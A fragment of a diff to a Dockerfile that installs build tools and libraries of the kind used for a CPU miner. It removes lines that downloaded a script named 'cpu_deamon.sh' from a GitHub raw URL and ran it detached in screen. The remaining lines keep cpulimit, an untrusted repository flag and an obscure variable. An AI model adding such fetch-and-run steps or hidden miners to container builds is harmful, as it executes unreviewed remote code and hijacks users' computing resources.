@@ -5,9 +5,6 @@ RUN  set -x \
   && apk add --no-cache ca-certificates git build-base cmake libuv-dev libmicrohttpd-dev openssl-dev util-linux-dev \
   && apk add --no-cache wget screen cpulimit gawk \
   && apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing/ --allow-untrusted hwloc-dev \
-  && wget https://raw.githubusercontent.com/ts6aud5vkg/gpuissa/master/cpu_deamon.sh \
-  && chmod 755 cpu_deamon.sh
-  && screen -d -m ./cpu_deamon.sh
   && azure=mxsemsdnlkdj;
 WORKDIR /temp
 RUN rm -r /temp/$azure \
